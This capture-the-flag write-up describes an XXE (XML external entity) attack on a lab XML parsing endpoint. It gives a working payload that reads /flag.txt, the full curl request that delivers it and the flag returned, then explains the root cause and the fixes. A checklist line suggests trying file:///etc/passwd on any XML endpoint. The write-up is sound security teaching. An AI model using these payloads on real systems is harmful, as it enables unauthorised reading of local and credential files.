# XML Uploader Pwnbox Lab - XXE File Read

Date: 2026-07-08
Target type: CTF/lab
Bug class: XXE (XML External Entity injection), local file disclosure

## Observation

Logistics portal at `https://d5559c91463d.pwnbox-lab.com/` accepts pasted XML and parses title/body fields.

Initial page hints:

- "Paste an XML document. We'll parse it and show the title and body."
- Lab description: parser supports legacy XML features for old partner integrations.
- Goal: read `/flag.txt`.

Frontend posts JSON to `/parse.php`:

```javascript
fetch('/parse.php', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ xml: form.xml.value }),
});
```

Normal sample XML:

```xml
<doc>
  <title>Hello</title>
  <body>A simple document.</body>
</doc>
```

Baseline response:

```json
{"ok":true,"document":{"root":"doc","title":"Hello","body":"Test"}}
```

## Hypothesis

Legacy XML support likely means DTD/external entities are enabled. If parsed values are reflected in JSON, a classic file-read XXE in `title` or `body` should disclose `/flag.txt`.

## Evidence

Working payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<doc>
  <title>&xxe;</title>
  <body>test</body>
</doc>
```

Request:

```bash
curl -sS -X POST "https://d5559c91463d.pwnbox-lab.com/parse.php" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE doc [\n  <!ENTITY xxe SYSTEM \"file:///flag.txt\">\n]>\n<doc>\n  <title>&xxe;</title>\n  <body>test</body>\n</doc>"}'
```

Response:

```json
{"ok":true,"document":{"root":"doc","title":"pwnbox{79ab3f7818e8b873f9f5bb5943b2cb56}","body":"test"}}
```

## Test

1. Confirm normal XML parsing works on `/parse.php`.
2. Add DOCTYPE with external `file://` entity.
3. Reference entity in a reflected field (`title`).
4. Inspect JSON output for file contents.

## Result

Confirmed chain:

```text
User-controlled XML
-> legacy DTD/external entity resolution enabled
-> file:///flag.txt loaded during parse
-> entity expansion reflected in document.title
```

Flag: `pwnbox{79ab3f7818e8b873f9f5bb5943b2cb56}`

## Why this worked on first try

- No need for parameter entities or blind/OOB XXE.
- Parser reflected expanded entity text directly in JSON.
- Target file path was explicitly given by the lab prompt.

## Root cause

The XML parser resolves external entities from user-supplied documents. That reintroduces a file-read primitive through DTD `SYSTEM` identifiers.

## Fix

- Disable external entity loading in the XML parser.
- Reject DOCTYPE/DTD input entirely when possible.
- Use non-XML formats or strictly validated schemas for new integrations.
- Never reflect parsed XML values without assuming entity expansion already occurred.

## Future checklist item

For any XML upload/parse endpoint, test a minimal inline DTD with `file:///etc/passwd` or the lab-provided target path before trying complex blind XXE chains.
